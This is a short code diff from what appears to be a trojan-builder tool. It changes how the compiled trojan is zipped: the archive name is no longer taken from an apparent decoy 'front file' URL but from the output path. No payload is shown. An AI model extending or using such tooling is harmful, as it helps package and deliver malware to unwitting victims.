@@ -26,6 +26,5 @@ trojan.create()
 trojan.compilea(options.out_file_path)
 
 if options.zip: 
-	trojan_name = options.out_file_path.split("/")[-1]
-	zip_name = options.front_file_url.split("/")[-1].split(".")[-2]
-	zipfile.ZipFile(zip_name + ".zip", mode="w").write(trojan_name)
+	zip_file_path = options.out_file_path.split(".")[0]
+	zipfile.ZipFile(zip_file_path + ".zip", mode="w").write(options.out_file_path)
